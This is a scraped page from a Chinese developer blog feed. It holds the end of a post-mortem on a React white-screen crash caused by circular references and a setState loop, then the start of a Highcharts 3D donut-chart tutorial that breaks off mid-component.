<li>这个崩溃发生在 React 生命周期</li>
<li>生命周期抛错时整个 UI 树会 unmount → 直接白屏</li>
</ul>
<p>这是典型的 <strong>现网级事故</strong>。</p>
<hr/>
<h2 data-id="heading-1"><strong>二、初次定位与修复：错误指向 componentDidUpdate</strong></h2>
<p>进一步追踪堆栈，定位到某个类组件的 <code>componentDidUpdate</code> ，然后我查看源码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(xxx) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(xxx) || ...) {
}
</code></pre>
<p>心想一定是这里出了问题，因为堆栈原因说的很清楚了，于是开始着手修改代码。</p>
<p>改完发现不是私有云分支，于是切换到私有云分支之后发现，<code>JSON.stringfy()</code>已经被替换成 <code>lodash.isEqual()</code> ，但是公有云没有下沉。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState</span>) {
    <span class="hljs-keyword">if</span> (!_.<span class="hljs-title function_">isEqual</span>(
      xxx.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...), 
      xxx.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...)
    )) {
        xxx
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(xxx);
    }
}
</code></pre>
<p>逻辑没有变化：</p>
<ul>
<li>比较 props 是否变化</li>
<li>变化后 setState 触发渲染</li>
</ul>
<p>我看问题已经被修复，于是询问了客户版本，原来是还没有升级最新补丁，于是帮助她升级补丁，验证后无问题。</p>
<hr/>
<h2 data-id="heading-2"><strong>三、第二次复现：isEqual 被编译成了 JSON.stringify</strong></h2>
<p>周一一大早用户发消息说又复现了白屏问题，然后我再次远程，查看 <code>webpack</code> 编译后的 <code>bundle</code> 时，发现真正运行的代码竟然是：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...)) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(...))) {
    ...
}
</code></pre>
<p><strong>打包后，lodash 的 isEqual 被直接替换成了 JSON.stringify 的结果对比。</strong></p>
<p>而此时报错依然是 <code>TypeError: Converting circular structure to JSON</code>。</p>
<p>此时怀疑是不是代码不对，对比 <code>commitId</code> 发现代码确实是最新的，说明经过 <code>webpack</code> 打包替换了， <code>isEqual</code> 被 <code>tree-shaking</code> 干掉了，构建器认为 <code>stringify</code> 足够。</p>
<p>但确实是还是报循环引用的错误，于是我使用 Chrome 的 Overrides 来修改现网源码去验证错误。</p>
<hr/>
<h2 data-id="heading-3"><strong>四、我利用 Chrome Overrides 热补丁修复：但又碰到了 React #185 错误</strong></h2>
<p>我做了个实验，把现网代码临时替换为：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> ((O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) !== (O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(prevProps))) {
</code></pre>
<p>不再 stringify 和深比较。</p>
<p>结果报错变成：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">React</span> <span class="hljs-title class_">Error</span> #<span class="hljs-number">185</span>:
<span class="hljs-title function_">setState</span>(...): <span class="hljs-title class_">Cannot</span> update a component <span class="hljs-keyword">from</span> inside the <span class="hljs-keyword">function</span> body...
</code></pre>
<p>这说明：</p>
<h3 data-id="heading-4">🚨 <strong>componentDidUpdate 里的 setState 引发了新的死循环。</strong></h3>
<p>因为 shallow compare 仍然总是 false → 永远进入 setState → 无限循环。</p>
<p>然后我将代码里的 <code>setState</code> 给注释掉。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">if</span> ((O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>)) !== (O.<span class="hljs-property">tool</span>.<span class="hljs-title function_">copyObj</span>(prevProps))) {
    <span class="hljs-comment">// this.setState(xxx);</span>
}
</code></pre>
<p><strong>页面终于正常了！！！</strong></p>
<hr/>
<h2 data-id="heading-5"><strong>五、为什么 copyObj 会制造循环？（关键根因）</strong></h2>
<p>项目自定义的 copyObj 代码：</p>
<pre><code class="hljs language-bash" lang="bash">cloneDeepWith(obj, value =&gt; {
  <span class="hljs-keyword">if</span> (value?.$<span class="hljs-variable">$typeof</span> || React.isValidElement(value)) {
    <span class="hljs-built_in">return</span> <span class="hljs-string">''</span>
  }
})
</code></pre>
<p>看似规避了 React element，<br/>
但 <strong>根本没有规避循环引用</strong>。</p>
<p>于是出现经典死亡链：</p>
<pre><code class="hljs language-matlab" lang="matlab">props → store → <span class="hljs-keyword">properties</span> → ... → props
</code></pre>
<p>cloneDeep 走到循环节点 →<br/>
lodash 在无法处理循环引用 →<br/>
JSON.stringify 再次遇到循环 → 崩</p>
<hr/>
<h2 data-id="heading-6"><strong>六、最终修复方案设计</strong></h2>
<h3 data-id="heading-7"><strong>修复目标</strong>：</h3>
<ol>
<li>不使用 JSON.stringify</li>
<li>不深度比较 props</li>
<li>避免所有 setState 死循环</li>
<li>可在现网用 overrides 修热补丁</li>
<li>不破坏现有业务逻辑</li>
</ol>
<hr/>
<h3 data-id="heading-8"><strong>🔥 我让GPT设计的临时安全方案</strong></h3>
<p>在 componentDidUpdate 内联一个：</p>
<ul>
<li>safeCopy（带 WeakMap 防环）</li>
<li>isSame（浅比较）</li>
<li>严格 setState 条件判断</li>
</ul>
<p>核心代码结构如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeCopy</span>(<span class="hljs-params">obj</span>) {
        <span class="hljs-keyword">const</span> seen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">x</span>) {
            <span class="hljs-keyword">if</span> (x === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> x;

            <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(x)) <span class="hljs-keyword">return</span> seen.<span class="hljs-title function_">get</span>(x);

            <span class="hljs-keyword">if</span> (x.<span class="hljs-property">$$typeof</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;  

            <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(x) ? [] : {};
            seen.<span class="hljs-title function_">set</span>(x, result);

            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> x) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> value = x[key];
                    result[key] = <span class="hljs-title function_">clone</span>(value);
                } <span class="hljs-keyword">catch</span> (err) {
                }
            }
            <span class="hljs-keyword">return</span> result;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">clone</span>(obj);
    }

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isSame</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">if</span> (a === b) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">if</span> (!a || !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> a) {
            <span class="hljs-keyword">if</span> (a[k] !== b[k]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> k <span class="hljs-keyword">in</span> b) {
            <span class="hljs-keyword">if</span> (a[k] !== b[k]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
</code></pre>
<p>示例，已在现网验证有效</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = <span class="hljs-title function_">safeCopy</span>(xxx);
<span class="hljs-keyword">const</span> b = <span class="hljs-title function_">safeCopy</span>(xxx);

<span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isSame</span>(a, b)) {
    <span class="hljs-keyword">const</span> nextValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">xxx</span>(...);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">value</span> !== nextValue) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">value</span>: nextValue });
    }
}
</code></pre>
<p>这同时避免了：</p>
<ul>
<li>任何形式的深比较</li>
<li>对 React element 的 clone</li>
<li>循环引用</li>
<li>setState 死循环</li>
</ul>
<hr/>
<h2 data-id="heading-9"><strong>七、总结</strong></h2>
<p>经过这次问题，知道了项目里还存在许多技术债，后续要继续优化。而私有云的定位比公有云比较复杂，后续要多多借助热补丁帮助定位并验证问题。</p>
<ol>
<li>Chrome Overrides 快速验证问题</li>
<li>代码后续重构</li>
<li>增加降级方案（后续优化）</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用Highcharts创建3D环形图]]></title>    <link>https://juejin.cn/post/7575937594351009835</link>    <guid>https://juejin.cn/post/7575937594351009835</guid>    <pubDate>2025-11-24T05:35:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351009835" data-draft-id="7568769772507414568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用Highcharts创建3D环形图"/> <meta itemprop="keywords" content="前端,ECharts"/> <meta itemprop="datePublished" content="2025-11-24T05:35:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Danny_FD"/> <meta itemprop="url" content="https://juejin.cn/user/1788247743933225"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用Highcharts创建3D环形图
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1788247743933225/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Danny_FD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:35:29.000Z" title="Mon Nov 24 2025 05:35:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>Highcharts 是一个功能完备、生态成熟的前端图表库，拥有良好的类型定义与主题生态。而 Highcharts 的 3D 饼图能力（3D Donut）可以进一步呈现层次与空间感，适合用于大屏可视化与运营展示场景。</p>
<hr/>
<h2 data-id="heading-1">使用流程</h2>
<h3 data-id="heading-2">准备工作</h3>
<ul>
<li>安装依赖：
<ul>
<li><code>highcharts</code>（核心库）</li>
<li><code>highcharts/highcharts-3d</code>（3D 模块）</li>
<li>可选：<code>highcharts-react-official</code>（React 包装组件，后文会解释它与原生 <code>div</code> 方式的差异与坑位）</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">yarn add highcharts highcharts-react-official
</code></pre>
<ul>
<li>引入与初始化 3D 模块（注意路径与版本兼容）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;

<span class="hljs-comment">// 初始化 3D 能力（必须调用）</span>
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);
</code></pre>
<blockquote>
<p>说明：部分文章或旧版本文档使用 <code>highcharts/modules/3d</code>，在现代构建工具（Webpack 5/Vite）或较新版本下可能出现构建失败或类型不匹配，推荐使用 <code>highcharts/highcharts-3d</code> 路径。</p>
</blockquote>
<h3 data-id="heading-3">创建第一个 3D 环形图</h3>
<ul>
<li>HTML 容器（单个）：</li>
</ul>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"dought"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height:300px;width:100%"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li>JavaScript 初始化（最小可运行示例）：</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);

<span class="hljs-keyword">const</span> <span class="hljs-attr">options</span>: <span class="hljs-title class_">Highcharts</span>.<span class="hljs-property">Options</span> = {
  <span class="hljs-attr">chart</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">options3d</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">alpha</span>: <span class="hljs-number">45</span> }, <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'transparent'</span> },
  <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: <span class="hljs-string">'总成本'</span>, <span class="hljs-attr">align</span>: <span class="hljs-string">'center'</span>, <span class="hljs-attr">verticalAlign</span>: <span class="hljs-string">'middle'</span>, <span class="hljs-attr">floating</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useHTML</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-attr">plotOptions</span>: {
    <span class="hljs-attr">pie</span>: {
      <span class="hljs-attr">innerSize</span>: <span class="hljs-string">'65%'</span>,
      <span class="hljs-attr">depth</span>: <span class="hljs-number">12</span>,
      <span class="hljs-attr">center</span>: [<span class="hljs-string">'50%'</span>, <span class="hljs-string">'50%'</span>],
      <span class="hljs-attr">size</span>: <span class="hljs-string">'90%'</span>,
      <span class="hljs-attr">dataLabels</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">format</span>: <span class="hljs-string">'{point.name}: {point.y}元'</span> },
    },
  },
  <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">type</span>: <span class="hljs-string">'pie'</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'金额'</span>, <span class="hljs-attr">data</span>: [ [<span class="hljs-string">'成本'</span>, <span class="hljs-number">1200</span>], [<span class="hljs-string">'收益'</span>, <span class="hljs-number">250</span>], [<span class="hljs-string">'2收益'</span>, <span class="hljs-number">158</span>] ] }],
};

<span class="hljs-title class_">Highcharts</span>.<span class="hljs-title function_">chart</span>(<span class="hljs-string">'dought'</span>, options);
</code></pre>
<hr/>
<h2 data-id="heading-4">注意事项与踩坑指南</h2>
<h3 data-id="heading-5">版本兼容性问题</h3>
<ul>
<li>模块路径差异：
<ul>
<li>旧文档常见 <code>highcharts/modules/3d</code>，但在部分 bundler/类型定义配置下会报错或打包失败。</li>
<li>推荐：<code>import highcharts3d from 'highcharts/highcharts-3d'; highcharts3d(Highcharts);</code></li>
</ul>
</li>
<li>ESM/CJS 混用：
<ul>
<li>在 Vite/webpack5 环境下，若 TS <code>moduleResolution</code> 或 <code>target</code> 不一致，会出现类型提示异常但能运行；务必保持 <code>tsconfig</code> 与 bundler 配置一致。</li>
<li>为什么新版更偏向 CJS：Highcharts 的部分功能模块（如 <code>highcharts/highcharts-3d</code>）以 UMD/CJS 形式发布，保持与旧版 bundler、Node 环境以及浏览器直引的最大兼容；多数构建工具会优先命中包的 <code>exports</code> 中 <code>require</code> 分支，使默认导出函数（<code>highcharts3d</code>）在 CJS 路径下更稳定，避免 ESM/默认导出互操作导致的 <code>undefined</code> 或类型不匹配。</li>
<li>ESM 与 CJS 的核心区别（速查）：
<ul>
<li>语法：ESM 使用 <code>import/export</code>（静态、可树摇），CJS 使用 <code>require/module.exports</code>（动态、不可树摇）。</li>
<li>加载：ESM 静态依赖解析，利于 bundler 优化；CJS 运行时解析，允许条件/动态 <code>require</code>。</li>
<li>默认导出互操作：CJS 引入 ESM 时常见 <code>require('pkg').default</code> 差异；ESM 引入 CJS 时需留意命名/默认导出包装。</li>
<li>环境支持：浏览器与现代 bundler更偏 ESM；Node 仍广泛支持 CJS，两者在解析与条件导出上存在差异。</li>
</ul>
</li>
<li>实战建议：
<ul>
<li>统一 <code>tsconfig.json</code> 与 bundler 的模块设置（如 <code>module: 'ESNext'</code>、<code>moduleResolution: 'bundler'</code> 或与工程一致的值），降低互操作差异。</li>
<li>对 Highcharts 3D 模块使用“安全默认写法”：<code>import highcharts3d from 'highcharts/highcharts-3d'; highcharts3d(Highcharts);</code>，该写法在 ESM/CJS 两种入口下都能正常工作。</li>
<li>如确需纯 CJS：<code>const Highcharts = require('highcharts'); const highcharts3d = require('highcharts/highcharts-3d'); highcharts3d(Highcharts);</code>，但在 React+TS 项目里更推荐前述 ESM 写法。</li>
</ul>
</li>
</ul>
</li>
<li>类型定义与 JSX：
<ul>
<li>在 React + TS 项目中，若使用 <code>HighchartsReact</code> 且 JSX 类型不兼容，可改为 <code>React.createElement</code> 或直接 <code>Highcharts.chart</code> 方式以规避。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-6">3. 为什么使用 highcharts-react-official 渲染会出现饼图偏移，改用 div 就解决了？原理是什么</h4>
<ul>
<li>现象：
<ul>
<li>使用 <code>HighchartsReact</code> 在某些布局（例如父容器 <code>display:flex</code>、存在 <code>transform</code>、或首次渲染时容器宽度尚未稳定）下，3D 饼图的中心点计算（依赖容器的实际尺寸与 <code>plotLeft/plotTop</code>）可能产生偏移。</li>
</ul>
</li>
<li>原因：
<ul>
<li><code>HighchartsReact</code> 封装层在 <code>componentDidMount/useEffect</code> 阶段创建图表，有时容器尚未完成布局或尺寸为 0，之后再 reflow 会导致 3D 透视与 <code>center/size</code> 百分比计算出现“错位”。</li>
<li>包装层会额外多一层 <code>div</code>，在包含 <code>position/transform</code> 的父级样式下，Highcharts 对 <code>getBoundingClientRect</code> 的读取与 3D 计算（<code>alpha</code> 透视）可能受影响，中心与标签的像素对齐误差被放大。</li>
</ul>
</li>
<li>解决：
<ul>
<li>改用原生 <code>Highcharts.chart(containerId, options)</code>，保证仅一个容器层；在 React 中于 <code>useEffect</code> 里创建与销毁，确保容器尺寸稳定后再渲染。</li>
<li>若仍需使用 <code>HighchartsReact</code>：
<ul>
<li>显式传 <code>containerProps={{ style: { width: '100%', height: &lt;固定高度&gt;, position: 'relative', overflow: 'visible' } }}</code>。</li>
<li>在外层布局稳定后再渲染组件，或在首次渲染后调用 <code>chart.reflow()</code>。</li>
<li>明确设置 <code>plotOptions.pie.center = ['50%', '50%']</code> 与 <code>size = '90%'</code>，并尽量避免父级 <code>transform</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7">数据加载与更新</h3>
<ul>
<li>动态加载：
<ul>
<li>在 React 中，使用 <code>useEffect</code> 监听数据变化，调用 <code>chart.update({ series: [{ data }] }, false)</code> 再 <code>chart.redraw()</code>。</li>
</ul>
</li>
<li>异步坑点：
<ul>
<li>初次数据为空，后续更新时若组件卸载重挂，需先 <code>destroy()</code> 再重新 <code>chart(...)</code>，避免多实例叠加。</li>
<li>数据类型混用（字符串/数字）会导致格式化异常：统一在入参处做 <code>Number(value) || 0</code> 的处理。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">性能优化</h3>
<ul>
<li>3D 饼图不适合超大量数据，建议控制项数（&lt; 12）。</li>
<li>关闭不必要的动画与阴影；必要时降低 <code>alpha</code> 或禁用后处理效果（在 Highcharts 3D 中主要与视觉相关）。</li>
<li>合理设置 <code>dataLabels</code>：
<ul>
<li>使用两段引导线并控制长度，避免过密导致重叠。</li>
<li>小值可在 <code>formatter</code> 中阈值过滤或缩短文本。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-9">深入探讨：配置项详解</h2>
<h3 data-id="heading-10">内置配置项</h3>
<ul>
<li><code>chart.options3d.enabled/alpha</code>：开启 3D 与倾角，过大倾角会放大偏移与重叠问题。</li>
<li><code>plotOptions.pie.innerSize</code>：环形图的内径大小，百分比字符串更易与容器自适应配合。</li>
<li><code>plotOptions.pie.depth</code>：3D 厚度，过大可能导致遮挡。</li>
<li><code>series[n].center</code>：强制图心坐标（百分比数组），可稳定对齐。</li>
<li><code>series[n].size</code>：半径，百分比更利于自适应布局。</li>
<li><code>dataLabels.format/useHTML/formatter</code>：标签文本与 HTML 自定义；<code>useHTML</code> 可实现两行样式。</li>
</ul>
<h3 data-id="heading-11">自定义配置（项目实践）</h3>
<ul>
<li>透明度：
<ul>
<li>利用 <code>Highcharts.color(color).setOpacity(sliceOpacity).get()</code> 为每个扇形生成半透明色，视觉更柔和。</li>
</ul>
</li>
<li>两段引导线：
<ul>
<li><code>plotOptions.pie.softConnector = true</code> 启用两段式；</li>
<li><code>dataLabels.distance</code> 控制第二段长度；</li>
<li><code>dataLabels.crookDistance</code> 控制第一段拐点位置（可以传百分比字符串）；</li>
<li><code>connectorColor/connectorWidth</code> 控制线条颜色与粗细。</li>
</ul>
</li>
<li>居中与图例：
<ul>
<li><code>legend.enabled = true</code> + <code>center: ['50%', '50%']</code> + <code>size: '90%'</code>，确保图例与图形协调摆放。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-12">案例代码（React 组件版，使用原生 div 渲染）</h2>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Highcharts</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts'</span>;
<span class="hljs-keyword">import</span> highcharts3d <span class="hljs-keyword">from</span> <span class="hljs-string">'highcharts/highcharts-3d'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-title function_">highcharts3d</span>(<span class="hljs-title class_">Highcharts</span>);

<span class="hljs-keyword">const</span> <span class="hljs-title class_">HCDonut3DChart</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-built_in">any</span>&gt; = <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> {
    dataList = [],
    title = <span class="hljs-string">''</span>,
    innerSize = <span class="hljs-string">'65%'</span>,
    sliceHeightRange = [<span class="hljs-number">8</span>, <span class="hljs-number">20</span>],
    depth,
    colors,
    containerId = <span class="hljs-string">'dought'</span>,
    sliceOpacity = <span class="hljs-number">0.85</span>,
    labelDistance = <span class="hljs-number">40</span>,
    connectorCrookDistance = <span class="hljs-string">'40%'</span>,
    connectorColor = <span class="hljs-string">'#999'</span>,
    connectorWidth = <span class="hljs-number">1</span>,
    labelUseHTML = <span class="hljs-literal">true</span>,
    labelNameColor = <span class="hljs-string">'#6A7570'</span>,
    labelValueColor = <span class="hljs-string">'#6A7570'</span>,
